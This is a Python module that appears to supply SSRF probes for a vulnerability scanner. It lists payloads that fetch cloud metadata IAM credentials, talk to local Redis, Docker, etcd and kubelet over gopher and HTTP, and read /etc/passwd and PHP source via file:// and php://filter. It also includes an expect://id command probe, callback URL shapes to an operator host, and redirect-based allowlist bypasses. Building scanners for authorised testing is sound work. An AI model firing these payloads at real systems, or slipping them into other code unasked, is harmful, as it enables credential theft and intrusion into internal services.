"""Seeds for the SSRF class.

A seed is a small expression that is semantically correct. It is not a payload:
the engine derives the spellings, here and in every module, from seeds like
these. Signatures are what make a result conclusive - a string the target has no
other reason to contain.
"""

from __future__ import annotations

from dataclasses import dataclass

# Parameters whose name suggests the application fetches what it is given.
# Used only to rank candidates when the user has not named one.
LIKELY_PARAMS = (
    "url", "uri", "link", "href", "src", "source", "target", "dest", "destination",
    "redirect", "return", "next", "continue", "callback", "webhook", "fetch",
    "load", "image", "img", "avatar", "file", "path", "page", "host", "domain",
    "proxy", "feed", "api", "endpoint", "service", "request", "open", "preview",
)


@dataclass(frozen=True)
class Probe:
    """A payload that either produces a signature or produces nothing."""

    name: str
    payload: str
    signatures: tuple[str, ...]
    note: str = ""
    kind: str = "ssrf"

    def describe(self) -> str:
        return f"{self.name}: {self.note}" if self.note else self.name


# Callback shapes. The address is substituted per attempt, so one list covers a
# whole family of destinations; the variety matters more than mutation here,
# because a filter is far more likely to be missing a scheme or an authority
# form than a character.
#
# Every shape must carry {token}: a call home is only evidence if it can be
# attributed to the action that planted it, and a callback URL without its token
# arrives anonymously and proves nothing.
CALLBACK_SEEDS = (
    "{url}",
    "{url}?next={url}",
    "//{host}/{token}",
    "http://{host}/{token}",
    "https://{host}/{token}",
    "{host}/{token}",
    "http://example.com@{host}/{token}",
    "http://{host}/{token}@example.com",
    "dict://{host}/{token}",
    "gopher://{host}/_{token}",
    "ftp://{host}/{token}",
    # Reached through a redirect the target follows on its own behalf.
    "http://{host}/{token}/redirect?to={url}",
)

# Cloud instance metadata. Reachable only from inside an instance, which is
# exactly why an application fetching one on a caller's behalf is the finding.
METADATA_PROBES = (
    Probe("aws-iam", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", ("secretaccesskey", "accesskeyid", "security-credentials")),
    Probe("aws-meta", "http://169.254.169.254/latest/meta-data/", ("ami-id", "instance-id", "local-hostname", "reservation-id")),
    Probe("aws-userdata", "http://169.254.169.254/latest/user-data/", ("#cloud-config", "ami-id")),
    Probe("azure-imds", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", ("computemetadata", "vmname", "subscriptionid")),
    Probe("gcp-meta", "http://metadata.google.internal/computeMetadata/v1/instance/", ("computemetadata", "project/project-id")),
    Probe("aliyun-meta", "http://100.100.100.200/latest/meta-data/", ("instance-id", "region-id")),
)

# Internal services that answer in a form we can recognise. The signature is
# what makes the answer conclusive rather than suggestive.
INTERNAL_PROBES = (
    Probe("redis-ping", "gopher://127.0.0.1:6379/_PING%0d%0a", ("+PONG",), note="Redis speaks text, so the reply is proof"),
    Probe("redis-info", "gopher://127.0.0.1:6379/_INFO%0d%0a", ("redis_version", "redis_mode", "# Server"), note="Redis INFO"),
    Probe("memcached-stats", "gopher://127.0.0.1:11211/_stats%0d%0a", ("STAT pid", "STAT version"), note="Memcached"),
    Probe("docker-version", "http://127.0.0.1:2375/version", ("apiversion", "gitcommit"), note="Exposed Docker API"),
    Probe("etcd-version", "http://127.0.0.1:2379/version", ("etcdserver", "etcdcluster"), note="etcd"),
    Probe("kubelet-pods", "http://127.0.0.1:10255/pods", ('"kind":"PodList"', '"items"'), note="Read-only kubelet"),
    Probe("elasticsearch", "http://127.0.0.1:9200/", ('"cluster_name"', '"lucene_version"'), note="Elasticsearch"),
    Probe("consul", "http://127.0.0.1:8500/v1/agent/self", ('"Config"', '"Member"'), note="Consul"),
)


def fastcgi_probe(port: int = 9000) -> Probe:
    """A real FastCGI request, which is what a PHP-FPM listener answers.

    A malformed record only proves something is listening. Asking for a script
    that does not exist makes the listener answer in its own words - and that
    answer is what distinguishes PHP-FPM from any other process holding a port.
    """
    from ...core.protocols import fcgi_request

    payload = fcgi_request(
        "127.0.0.1",
        port,
        {
            "SCRIPT_FILENAME": "/ik-nonexistent.php",
            "REQUEST_METHOD": "GET",
            "SERVER_PROTOCOL": "HTTP/1.1",
            "GATEWAY_INTERFACE": "CGI/1.1",
        },
    )
    return Probe(
        "fastcgi-php-fpm",
        payload,
        ("Primary script unknown", "File not found", "Access denied", "PHP"),
        note="PHP-FPM answers a real FastCGI request; a port that merely listens does not",
        kind="protocol",
    )

# File disclosure through a fetch, and the wrappers that turn a read into a
# chosen encoding.
FILE_PROBES = (
    Probe("file-passwd", "file:///etc/passwd", ("root:x:0:0", "daemon:x:1:1"), kind="protocol"),
    Probe("file-hostname", "file:///etc/hostname", (), note="short file, no signature: kept for engines that compare bodies", kind="protocol"),
    Probe("file-win-ini", "file:///c:/windows/win.ini", ("for 16-bit app support", "[fonts]", "[extensions]"), kind="protocol"),
    Probe("file-hosts", "file:///etc/hosts", ("localhost",), kind="protocol"),
    Probe("php-filter-passwd", "php://filter/convert.base64-encode/resource=/etc/passwd", ("root:x:0:0", "daemon:x:1:1"), note="base64 read, decoded before matching", kind="protocol"),
    Probe("php-filter-index", "php://filter/convert.base64-encode/resource=index.php", ("<?php",), kind="protocol"),
    Probe("php-input", "php://input", ("<?php",), kind="protocol"),
    Probe("data-uri", "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+", ("phpinfo",), kind="protocol"),
    Probe("expect-id", "expect://id", ("uid=0(", "uid="), kind="command"),
    Probe("dict-redis", "dict://127.0.0.1:6379/CONFIG%20GET%20dir", ("dir",), note="dict speaks a useful subset of Redis", kind="protocol"),
)

# Answers that mean "the value reached a parser and was acted on" even when it
# is not the answer we hoped for.
DIAGNOSTIC_MARKERS = (
    "invalid url", "unsupported scheme", "no such host", "connection refused",
    "failed to open stream", "expects parameter", "not allowed",
)


@dataclass(frozen=True)
class HeaderProbe:
    """A destination that only answers when the request carries a header.

    A URL parameter cannot add a header, so these are unreachable through the
    ordinary path however they are spelled. They are reachable by writing the
    request over gopher instead - which is the point of having both.
    """

    name: str
    host: str
    port: int
    path: str
    headers: tuple[tuple[str, str], ...]
    signatures: tuple[str, ...]
    note: str = ""


# GCP and Azure both refuse a request that arrives without their magic header.
# A scanner that only sends URLs reports these as clean; a scanner that can
# write the request reports the instance.
METADATA_HEADER_PROBES = (
    HeaderProbe(
        "gcp-header",
        "169.254.169.254",
        80,
        "/computeMetadata/v1/instance/",
        (("Metadata-Flavor", "Google"),),
        ("project/project-id", "instance/hostname", "lab-project"),
        "GCP refuses a request without Metadata-Flavor: Google",
    ),
    HeaderProbe(
        "azure-header",
        "169.254.169.254",
        80,
        "/metadata/instance?api-version=2021-02-01",
        (("Metadata", "true"),),
        ("vmname", "subscriptionid"),
        "Azure refuses a request without Metadata: true",
    ),
)


# Redirect shapes. A whitelisting filter cannot be walked past by spelling
# anything differently - only by routing through a host it already trusts, so
# the operator names one and the destination is substituted into it.
VIA_PLACEHOLDER = "{target}"

# Where a redirect commonly hides on an application, asked only when the
# operator has not named one.
REDIRECT_CANDIDATES = (
    "/redirect?url={target}",
    "/redirect?to={target}",
    "/redirect.php?to={target}",
    "/url?url={target}",
    "/link?url={target}",
    "/out?url={target}",
)
